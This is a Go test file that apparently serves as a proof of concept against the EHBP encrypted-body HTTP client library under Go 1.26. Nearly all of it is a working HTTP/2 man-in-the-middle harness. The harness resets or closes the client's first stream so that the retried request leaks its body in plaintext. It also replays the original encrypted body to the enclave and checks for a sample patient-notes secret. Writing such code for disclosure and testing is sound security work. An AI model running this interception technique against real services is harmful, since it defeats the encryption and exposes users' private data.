package poc4go126

// Library-level check of EHBP v0.3.2 (as pinned by tinfoil-go v0.15.x/v0.16.x)
// under the Go toolchain the Go 1.26-built enclave services use
// (harness, websearch, doc-upload, sync). Public API only; http.DefaultTransport
// untouched; the TLS peer is trusted through SSL_CERT_FILE.
//
// Run: GOTOOLCHAIN=local SSL_CERT_FILE=../poc3/certs/ca.pem POC_CERT_DIR=../poc3/certs \
//      ../go1.26.6/bin/go test -v -count=1 .

import (
	"bytes"
	"crypto/tls"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	ehbpclient "github.com/tinfoilsh/encrypted-http-body-protocol/client"
	ehbpidentity "github.com/tinfoilsh/encrypted-http-body-protocol/identity"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

type capture struct {
	headers map[string]string
	body    bytes.Buffer
}

type mitm struct {
	mode     string
	upstream string
	mu       sync.Mutex
	alpn     []string
	caps     []*capture
	first    *capture
}

func (m *mitm) serveConn(t *testing.T, c *tls.Conn) {
	defer c.Close()
	if c.Handshake() != nil {
		return
	}
	m.mu.Lock()
	m.alpn = append(m.alpn, c.ConnectionState().NegotiatedProtocol)
	m.mu.Unlock()
	if c.ConnectionState().NegotiatedProtocol != "h2" {
		return
	}
	pre := make([]byte, len(http2.ClientPreface))
	if _, err := io.ReadFull(c, pre); err != nil {
		return
	}
	fr := http2.NewFramer(c, c)
	fr.WriteSettings()
	dec := hpack.NewDecoder(4096, nil)
	var hb bytes.Buffer
	enc := hpack.NewEncoder(&hb)
	streams := map[uint32]*capture{}
	for {
		f, err := fr.ReadFrame()
		if err != nil {
			return
		}
		var ended uint32
		switch f := f.(type) {
		case *http2.SettingsFrame:
			if !f.IsAck() {
				fr.WriteSettingsAck()
			}
		case *http2.PingFrame:
			if !f.IsAck() {
				fr.WritePing(true, f.Data)
			}
		case *http2.HeadersFrame:
			fields, err := dec.DecodeFull(f.HeaderBlockFragment())
			if err != nil {
				return
			}
			s := &capture{headers: map[string]string{}}
			for _, hf := range fields {
				s.headers[hf.Name] = hf.Value
			}
			streams[f.StreamID] = s
			if f.StreamEnded() {
				ended = f.StreamID
			}
		case *http2.DataFrame:
			s := streams[f.StreamID]
			if s == nil {
				continue
			}
			s.body.Write(f.Data())
			if n := uint32(len(f.Data())); n > 0 {
				fr.WriteWindowUpdate(0, n)
				fr.WriteWindowUpdate(f.StreamID, n)
			}
			if f.StreamEnded() {
				ended = f.StreamID
			}
		}
		if ended == 0 {
			continue
		}
		s := streams[ended]
		m.mu.Lock()
		m.caps = append(m.caps, s)
		isFirst := m.first == nil
		if isFirst {
			m.first = s
		}
		first := m.first
		m.mu.Unlock()
		if isFirst {
			switch m.mode {
			case "rst":
				fr.WriteRSTStream(ended, http2.ErrCodeRefusedStream)
			case "protocol":
				fr.WriteRSTStream(ended, http2.ErrCodeProtocol)
			case "goaway":
				fr.WriteGoAway(0, http2.ErrCodeNo, nil)
				time.Sleep(50 * time.Millisecond)
				return
			}
			continue
		}
		up, _ := http.NewRequest(http.MethodPost, m.upstream+s.headers[":path"], bytes.NewReader(first.body.Bytes()))
		up.Header.Set("Ehbp-Encapsulated-Key", first.headers["ehbp-encapsulated-key"])
		resp, err := (&http.Client{Transport: &http.Transport{}}).Do(up)
		if err != nil {
			t.Errorf("upstream: %v", err)
			return
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		hb.Reset()
		enc.WriteField(hpack.HeaderField{Name: ":status", Value: "200"})
		enc.WriteField(hpack.HeaderField{Name: "ehbp-response-nonce", Value: resp.Header.Get("Ehbp-Response-Nonce")})
		fr.WriteHeaders(http2.HeadersFrameParam{StreamID: ended, BlockFragment: hb.Bytes(), EndHeaders: true})
		fr.WriteData(ended, true, b)
	}
}

func run(t *testing.T, mode string) {
	dir := os.Getenv("POC_CERT_DIR")
	if dir == "" || os.Getenv("SSL_CERT_FILE") == "" {
		t.Skip("set SSL_CERT_FILE and POC_CERT_DIR")
	}
	cert, err := tls.LoadX509KeyPair(filepath.Join(dir, "gw.pem"), filepath.Join(dir, "gw.key"))
	if err != nil {
		t.Fatal(err)
	}
	id, _ := ehbpidentity.NewIdentity()
	enclave := httptest.NewServer(id.Middleware()(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		w.Write([]byte("enclave echo: " + string(b)))
	})))
	defer enclave.Close()

	ln, err := tls.Listen("tcp", "127.0.0.1:0", &tls.Config{Certificates: []tls.Certificate{cert}, NextProtos: []string{"h2", "http/1.1"}})
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	m := &mitm{mode: mode, upstream: enclave.URL}
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go m.serveConn(t, c.(*tls.Conn))
		}
	}()

	pub, _ := ehbpidentity.FromPublicKeyHex(id.MarshalPublicKeyHex())
	tr, err := ehbpclient.NewTransportWithIdentity(pub) // => http.DefaultTransport
	if err != nil {
		t.Fatal(err)
	}
	const secret = `{"model":"m","input":"embedding of: patient notes for John Doe, MRN 0042"}`
	req, _ := http.NewRequest(http.MethodPost, "https://"+ln.Addr().String()+"/v1/embeddings", strings.NewReader(secret))
	resp, err := (&http.Client{Transport: tr, Timeout: 20 * time.Second}).Do(req)
	if err != nil {
		t.Fatalf("[%s] client error: %v", mode, err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	m.mu.Lock()
	defer m.mu.Unlock()
	t.Logf("[%s] %s: client got %d %s body=%q; alpn=%v", mode, runtime.Version(), resp.StatusCode, resp.Proto, body, m.alpn)
	leaked := false
	for i, c := range m.caps {
		b := c.body.String()
		if len(b) > 100 {
			b = b[:100] + "..."
		}
		t.Logf("[%s] mitm capture %d: ehbp-encapsulated-key=%.16s.. body=%q", mode, i, c.headers["ehbp-encapsulated-key"], b)
		if c.body.String() == secret {
			leaked = true
		}
	}
	if !leaked {
		t.Fatalf("[%s] no plaintext observed", mode)
	}
	t.Logf("[%s] VULNERABLE under %s", mode, runtime.Version())
}

func TestGo126RefusedStream(t *testing.T) { run(t, "rst") }
func TestGo126GoAway(t *testing.T)        { run(t, "goaway") }
func TestGo126ProtocolErr(t *testing.T)   { run(t, "protocol") }

var _ = net.IPv4len
